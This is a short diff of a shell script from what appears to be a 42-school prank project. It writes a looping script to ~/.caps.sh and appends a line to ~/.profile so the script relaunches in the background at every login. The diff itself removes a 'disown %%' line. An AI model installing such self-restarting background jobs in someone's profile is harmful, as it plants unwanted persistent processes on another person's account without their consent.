@@ -6,7 +6,7 @@
 #    By: tomoron <marvin@42.fr>                     +#+  +:+       +#+         #
 #                                                 +#+#+#+#+#+   +#+            #
 #    Created: 2024/06/06 15:15:24 by tomoron           #+#    #+#              #
-#    Updated: 2024/06/06 15:33:16 by tomoron          ###   ########.fr        #
+#    Updated: 2024/06/06 17:29:04 by tomoron          ###   ########.fr        #
 #                                                                              #
 # **************************************************************************** #
 cd
@@ -41,4 +41,3 @@ while :;do
 done" >> ~/.caps.sh
 echo "bash ~/.caps.sh&" >> ~/.profile
 bash ~/.caps.sh&
-disown %%
